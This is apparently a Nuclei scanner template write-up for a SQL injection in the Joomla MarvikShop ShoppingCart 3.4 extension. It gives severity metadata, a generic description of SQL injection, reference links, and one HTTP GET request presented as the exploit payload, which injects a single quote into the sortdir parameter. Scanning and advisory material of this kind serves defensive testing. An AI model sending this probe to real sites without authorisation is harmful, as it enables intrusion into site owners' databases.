# Nuclei Template: Joomla MarvikShop ShoppingCart 3.4 - Sql Injection
**Template ID:** joomla-marvikshop-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`joomla-marvikshop-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Joomla MarvikShop ShoppingCart 3.4 is vulnerable to SQL injection which is a code injection technique that might destroy your database. SQL injection is one of the most common web hacking techniques. SQL injection is the placement of malicious code in SQL statements, via web page input.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=%27
```

## References
- https://vulners.com/zdt/1337DAY-ID-38020
- https://cxsecurity.com/issue/WLB-2022100015
- https://extensions.joomla.org/
